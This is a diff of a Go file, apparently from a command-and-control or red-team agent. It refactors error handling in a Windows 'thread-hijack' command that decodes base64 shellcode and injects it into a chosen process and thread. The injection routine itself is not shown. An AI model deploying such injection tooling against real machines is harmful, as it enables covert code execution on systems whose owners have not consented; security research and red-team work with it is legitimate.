@@ -57,70 +57,38 @@ type ThreadHijackParams struct {
 // Execute executes the thread-hijack command
 func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	var params ThreadHijackParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: No shellcode data provided",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: Invalid PID specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: Shellcode data is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Shellcode data is empty")
 	}
 
 	output, err := performThreadHijack(shellcode, uint32(params.PID), uint32(params.TID))
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("\n[!] Thread hijack failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("\n[!] Thread hijack failed: %v", err))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // performThreadHijack executes the thread hijacking injection pipeline
